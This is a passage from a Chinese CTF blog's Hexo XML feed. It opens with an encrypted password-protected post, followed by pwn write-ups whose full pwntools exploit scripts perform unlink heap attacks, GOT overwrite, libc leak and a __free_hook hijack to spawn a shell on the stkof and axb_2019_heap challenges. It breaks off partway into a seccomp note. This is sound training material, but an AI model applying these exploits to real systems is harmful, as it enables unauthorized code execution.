5ae0df5fc344c9e90784c0d86e75cef8fb949c9179a84b51fa6fb6fe6b7f25a0dc099dbd9ed6bc38c840f2a02ae38078a352d6965a7e1c5e6e56f864b91ae83171324280374991e1e0d0f62f632a57edd25dadb457744f02933213b2f9bd519b29523d7b32f0568c94cce3c7b13446e0053c5163634806efd316375d6e682bde4bf185ff30a1fed28dc6c172076dae1fe9a422d80a4fc46213d4cee7568898849a236e39dd32c4ae8b0b6357e5340a9ae19a4392f1a835361bf54df2d426f9397345885a3e704041fa02ed8ffca486e30150ad603e9cecebbc6d601318052eb4b750b9a0622748d327dd7414d97af1cf8f91ee960a9571fc7413062f6f063e503e0efd944b0d2f89374478dc2b8c560dab50395d4288b916bf70925d4d1e68582af81909a47e4641fd547dc185fdaa7b7d3b34067ef08df391f270cfa80e4a7285a7510929da450660aea099711bb64a883252e3905b696ece22c12987676cc8dda4bbf93b0b227955ea4c3149e83faf3d2a64133dafdc41483ffd8f6e0b4eddbd3a266e0625e844f477be7fa0aa38aa1150a58f5ef780550536338b27164cbb90a5f7b7493100e15f6d84710e6459411ed859306975174b7f73bc5ab8b74e87b3a8bf20273ffcd1127d07fd71b3e216ba062b20a000ae12fccdbe04ede2f0b45ee4a91eb3a7f403d818e1c61a2b90fd4fa295aac370ddb3c27fd0536c1418851cf549f4430793ba0a66f1f0fe6e8eaf2096c803b133fb40da9d2620782736d32e040d08bf7c8fbbb82083f8a39b74614590735dc194b79ca74e6a305b665175de8f33e6b601de96a948e6fa9c96247b9d557afd8f200e03077fcc16e14ed2bed30c13213cdf7f8c3b82aa783a9256b0a672e9755cfdd4532854d9bb7e0d83cb68693f13275f6e99ccb2fb801ae279568251e004c53c42d01ce850664dd083c60e735c5cbd904316b3c29e6872b65c5b11a3b81f399ef24d3cde3b4ca2a55a067bf162fd857e903b487673d2b02fce56b269f657bd9793dbee905ce5482c7b43775df776201e57d5f9aca2dbcf6483f79f50bade673b2be568a52e3d89c2ccfcbf91b3c9462a3fba19cf4a331a6dd7ccf68a4f1c216e724b506e910b0acf28b28beee95fb7836eeabf2daa261ee0fdcfc6158877c5b7689cbec95174c70590fc357be2abb704dcd128f80049afae70fe0770840a8d4fb6853b1fe378aae2ad01770d5b4d530c8ea97333623feceb614ee787cd11a47ab06defaada20840f615017b9d6d4ad8a8c80887ca1bf83796c29b807ccb8d4bd274196b4643be7e58ebe2150dbc6c5a861017cb6b1f93eb7e6d4e848a979636e96786a6285c7eb7d665e88615588d22a7bd6974a41e242740561747f2974b4971d8d3cf6cde97ad4eb02a0c1b7a362d637b8fdf5a6645c617f32df8d5144708beea32ae4c88a5a0384b61b613915f84cebc025e799288fa19d58ca42109e0578548a3cd97517eb3597fc80033ec483d0492e0de631a481b314050348e253c499cb1549ae94612682d3c0b091b9e980b092cc6f9b3a9e34cd9d8d17ba4ddfde86be8363cf9aeb8ee6a751981c35cd3a7c416a0ff8141d8061281ec186d99e8e6fd0cd77b4bbd2a4e923810beef301f1e0cb206a2e8399011ebc3e5563b0951ca4bed1825a333cd77e4ff4fa8e57c95bfcc836a0368cc7bfcfbd70d41a8c44487ab19d8a56c789e5d294a25ae6a606094a89faba970a80fc7b1f219c081ca85a1fa4521d3e15d0cd3c816ada5813bb4780ab0b5620026c01145b1c6f854fb68dbcfb332a2e2f6d02a7b6e8edf380863f6cba1d9aa274461bebccf41e25e0f6c6cb7de4242bd0b2473c08dffa5a9a73f42c32ded61d0048f102a12d8c5a0a87da95c4863d62d76c759316cf3bbf55306277526a9110e6b9884cdf5885c84f0461b69ba6ba7dd09a21ca7e14786785f0d4f30063f2c0d60869bf96a4c637fee3c95439ddf90794ce986068083bbbe5be9979d878f5dfb8e3a57e956b37928361dfd3eb6bfd80ace52810dc469f09eaf809030811fa267ded1758a8e1950cd2304b9dea0c0fa9d86fc9e99f50680e5663a36f8465304407dd40a2a4a0e624de65a64497d00037031a7b91827168bf1795cd0a83d8498adbda91d85086249944418df031f9547fa1cb7d49c68dee852e5b3be622a6e117791a720f12d8233cd45ace21f8874b11a24d1c39b58b4cd4c761c3e4efea7c28750dce9ef4f8f9b8b4c71d326d367f94559032d9ceb122cf49f9b4bd124ea5d7a45b51a1cea72c374b25ee861b0aa3cecd92696f648c6cf4ad786be265e99829c8f9ef7547e1f16ba654848365f326e997952a564642c39b8fba0cf8ca5b50ccd7c2ad11e3b80064c2c7d642681afb03d2f96007f8ff60a35832e184b061e36efd90079a96b0d69cbaff40ed9017ebf26c7156ad7cc01f8a459561a9efd6d012d2d399cb69a96ebc56cbe74cc5f06a74e282722b5bf0574dfac9d5f0264233d628356be2c103a89cd165ddbf47c0acf744e922f564713e3ccd450c50d235445e75e295c52c27f286a11ffdf8f39a4aab2c0d953fe57f810d25c91fa8a8af42d2453a4a48eada1cf1acf4c6844c629de04eaea119fdf978012ae453f1c26d3cd1f78ca1e674fd35898d3c529eab101cb0e196a9c86ade8b5cd0e613728fd12b5b9fd11acae9403eb41d7501de0e2589c1e7f3d2fffd59206ac4e537ceeae19ceaaf6829db4581dc0b14417579908fa2aa932217dffcbb3c77456eb3c5a37253c6297649927a87353da9221b99f7f69f2434904a4fc8bd701be1984708eec6c045cd76a6b08dc629d23469c2fbf04e99d91088fda1a6ac6b5c8f57ebd3fc13d93f74529aa438e212a4bed67cc6205e8f860e0e0375940bb05fa25b5a410f26ea56d1cc0751f2d5315b5fbaa4549084c504d1d600c4be97701fe243f222bb9ecc8a5260fdb1e09c7cbc2b70e18bcc204f43321427316fb62653743333aed955d38de6633a45aef806504bd5b503af7f07306ceec3255f7f4bf21fda2d03cfc65a0b549a3c75fb44d443df501e516d7bea6dcc8f1834408b6e22853bb8bbcf3079a12a0ba257cbf408bb8483082b4028aba57908dfd52a5b25aec8d4a96e14b73a9c4936a0603e465cf409298b147a4b67dc082bbad7f9f9b5234902ac8bb97e514d54f09c5575a32da647c2288ef998c33e408d54764e963ecc2c55d52c28e92b1f2cfdbfb0a1ba3f4efa230dcf928ad261418a80e21b0011868b1a26caedf4256ef5ac3fb091957835e5ef271d2376630b232e5e4bdc600468f55fe04a9f4d80255d752362a0b9df9c5f2efac5946964231c8bd4b1dbc921cbeacc54afe429ca549a3fef78cb2825006f089f2b45103747477fd3598b536202b06df536847cc385f3dc36f0d16ca5c32364b379a3e10c2402ce0e75d06ffcb900bd1e8673345e836aaf833e9ba649a0fc78c0a644701b4b6c849c296007e4bdaec6a3adb9f1fcbbfaa4e025e0a0a9ba0af37cf39ba397fa8cb3a4626cb62d35be0b22b25a572654d93cac8890421e07f8c6eabe4f267e56c2cbd10c8d3b14723e79d76a9038a73d4d51f81473cc1bc3c99df369b4b866b846b2b635be9452511e10cedd351279878382d9befb59cf471d5b5514bf8ed9c42bd4f7035875bcf2fe394d9d5b637a398959abc7366c40365c04a3bec4162ab8dd3beb554cd54497ed380f94a9f07b933687a3c20d4557a3b569ffebfde15265ff61c7512edf9a4ff919e1e0f260d46aef26011e144ce873ba7f0f7dda9f5a0895576a20474948b3ca31fa732b3f9279647481b0602297b813491e11d15ac0906eacd2ff339a59e3c8efacaa7df2c1a138725252010197c82b3aa205a6934755c14a625045c74d9de52072a1569d5feb808db3db481e9ea0d994ac6268abc0c6a949092584cb54c24d8ac3d0c866a6c4a571c045e06408d6fbd8f3f78ec21bcd09daff96674b81ade1a9cced0ce12025c7f63ee9d8428e25eecb3c2c1d53e37ac0072b728b2afb103ef5c44ddff3a0b5c6f0adb6c28ed0ce48e955e5a801274ca4c85a732e77758028d61face50493e859cb60445782a7d50a5e17eef78ddfc276f669a61fe3a5d0a0c9f4ac2f13241ccaa32c4709c8db3c215d2078f55e493559a7f0833a1593d49bc8ea5265df3e2ec9e663d6c72470e6339233f02f89e64a0d01a390dedc4b8b9f79d9c5ea2fae3f547014dee7e44fdd965faa8fe5793f2464633c6a676841aa7f3ca5e6884a0e32542522a0eba194ea13db43378e449711f10c5d5950ea0f6d228e6cedb99884cab3ff73b1dc81450eeb7720f4f0dfcd8482674ad1a280711350f0235af6ce66e8d6033c8932871e33bb3b6fb1e50ed98e98b28595a73ed4ebbf534b73b7a99a33db6e8fe44cc3510ba3eeef109f98e5443bfcd05bd3e60eedd70093f0132c492045effb672fe71befd1863e2867803ad01ce87c15e4eec5da98ba9a720f7ba3ae4efa782b7bdaa5bea316ba903ffcbeb3be27ee47d9c1db5684a7ef86c7e261022867983298c8d63a12ced7b51714e5964e8dcfcb931320661b1bd6a1819046192d0cd190a4dca27444263b36320b2640cf125657e58072c3b5c2aea0eef080d3331cb9664e927f097ba0fef82bebbf1f3c2c460f1f1e35a8fda0bf085f039d8cc0d2cf57ed2fd8984606d067d82d3aea531869e5f18ce0475eb7b15c208662179e029da64a15bd6290024d7d5eef80517ab89cbfa76aa3484a3dbdf86b42ea9e87e358cf7a92e48b34b9c1017a6836d05006455eee4d205c28b141d47966b2db772fb5c3dd1373d1816f1e8e81e4390dd97b298d1164181b2a6d8f448dd1bbe6808ac05aec4411d06e83d564dae5bb40f88c603fa9c5fb16b6d149e972845a69452d5cac15c815d40221e4ac28d3f029c4d81672f4518a43ae199c89424396069bfca977dc26120265766cb99e433013f54610d5df2401c2c51f3a6c4cfe96b5790b3b6d8a3bdf154d81875d4fe7b7abcc0aaff6bc1270713eb16536370364fca482df7d97b5d99f51a81d12d2c1df0f1653ce3014ebc01237d208d000b86769b10d0176970aee88f7dcaf2b3f425763440727b0d748243047231156f4cc0e47843295be4822ba25cd1f33639d045da54d3475e245e2b89fe74c8d517c044f146d61444e76ab6c29a49523cdd1ec1bb6cbb14c39fbf1895cb87114422b9f9b497447869ff6cb35ada6f2892442b54c02b4e0bf45f2d035f946ec930bcb580584118a1338b18a01865e507d9aaef3eec3686b77ebec6cff1d98261f5618003a8ddf17e955657622d62f93d9c7d5c6b18d3b66d0e2a2dee742985220a4b49a40720f433ad0c35ee257adf8d2367290034e759a87f8f8fc541ade18d2eaeddbc7f4e56828488c85a710717e78785bdd2ebdd491a52fa2ed99df75a7b2d2b27d2c5181d82b8c3a033256a7df8dadc82047556f582946872f907b9db7f8169393791aded7c0f769c174d813c90483baf0a558297b048bf848f23d0bae7cd75db6e378b0ac559c973ecfbb2a3b31e53862fe92b788e39894cfae2507180617a7fc683f1f0c6219da21eb5b6c56f1ac589c45cd5f8d1e1144c9a7345c8ac13f4d921ebe80dff578aa30415f3231ee9e2e7e3ce42527c7df5ae8c5dbb76643020b36d328a28305a3ce8d7d743a6dd8c535f91795598f0e22624dd0b9e672343045982c6433b1a86d2fdd7e3d04dd0b05404af1a0a9ecdc48747423796658659356d7c688d3f9379349c500f048f0a1798cbcba83edb4e7002e8f032b7eb612221496c24adaa725b48454600637a6022cc1671c055a2295833e22da054abb0ceb3bcd62020767919a6e3281659294a2f602cce101d0107716f161f36b3fd96f9f616d7a9956410623f587ac57d06e0257159f4c9623784df07d50ccf66cc69b72377bbfbc46cf35bbf14a658d391fcfc59a56689560309dcf1202f2e2ca0123c9c62357d15dd7ec8673426cf0fe9d69f3243d3259fa9b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Pease input your password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2021/11/25/unlink/"/>
      <url>/2021/11/25/unlink/</url>
      
        <content type="html"><![CDATA[<p>堆溢出漏洞 ——unlink</p><span id="more"></span><blockquote><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163038712516780265472330%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163038712516780265472330&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108481889.first_rank_v2_pc_rank_v29&amp;utm_term=hollk%20unlink&amp;spm=1018.2226.3001.4187">推荐 unlink 基本知识讲解</a></p></blockquote><h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof">#</a> <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">2014 HITCON stkof</a></h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">hollkelf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    hollk = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hollk = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(hollk)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    hollk.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    hollk.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    hollk.send(content)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    hollk.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    hollk.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size inorder to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head - <span class="number">0x8</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    hollk.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(hollk)</span></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(hollkelf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(hollkelf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        hollkelf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(hollkelf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = hollk.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    hollk.send(p64(binsh_addr))</span><br><span class="line">    hollk.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="axb_2019_heap"><a class="markdownIt-Anchor" href="#axb_2019_heap">#</a> axb_2019_heap</h2><h3 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h3><ol><li><p>pwndbg 使用 regs 查看寄存器里得值</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111242245670.png" alt="image-20211124224540522"></p></li><li><p>利用思路</p><ul><li>利用格式化字符串泄露 libc 和程序基址</li><li>运用 unlink 将 chunk 0 地址覆写为 free_hook 的地址</li><li>将 system 地址写入 free_hook</li><li>触发写入的’/bin/sh’块的删除，执行 system (’/bin/sh’)</li></ul></li></ol><h2 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26144)</span></span><br><span class="line">p = process(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;):&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content: \n&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%11$p%15$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1186</span></span><br><span class="line"><span class="comment">#success(&quot;base:&quot;+hex(base))</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">240</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss=base+<span class="number">0x202060</span></span><br><span class="line">success(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)+p64(<span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw orw</title>
      <link href="/2021/11/17/pwnable.tw_orw/"/>
      <url>/2021/11/17/pwnable.tw_orw/</url>
      
        <content type="html"><![CDATA[<p>prctl 内核沙箱机制</p><span id="more"></span><h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h2><p>prctl seccomp 相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时过滤掉某些 syscall，只允许使用部分 syscall。</p><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从 2.6.23 版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp 安全机制能使一个进程进入到一种 “安全” 运行模式，该模式下的进程只能调用 4 种系统调用（system call），即 read (), write (), exit () 和 sigreturn ()，否则进程便会被终止。</p><h2 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172023579.png" alt="image-20211117202323531"></p><p>开启了 canary</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172031319.png" alt="image-20211117203126264"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172032512.png" 